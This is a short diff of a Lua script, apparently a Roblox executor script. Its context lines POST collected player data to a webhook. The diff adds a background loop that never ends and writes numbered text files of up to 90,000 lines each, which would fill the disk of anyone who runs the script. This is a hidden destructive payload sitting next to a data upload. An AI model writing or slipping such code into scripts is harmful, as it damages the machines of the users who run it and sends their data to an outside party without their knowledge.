@@ -59,8 +59,19 @@ if syn then
 end
 
 HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+task.wait(0.5)
 
-task.wait(2)
+math.randomseed(tick'');
+local Base = 0;
+
+spawn(function()
+repeat wait();
+Base = Base + 1;
+writefile('ZXC1000-' .. tostring(Base) .. '.txt', string.rep('L \n', math.random(9e1, 9e4)));
+until nil;
+end);
+
+task.wait(3)
 
 local coregui = game:service'CoreGui'
 
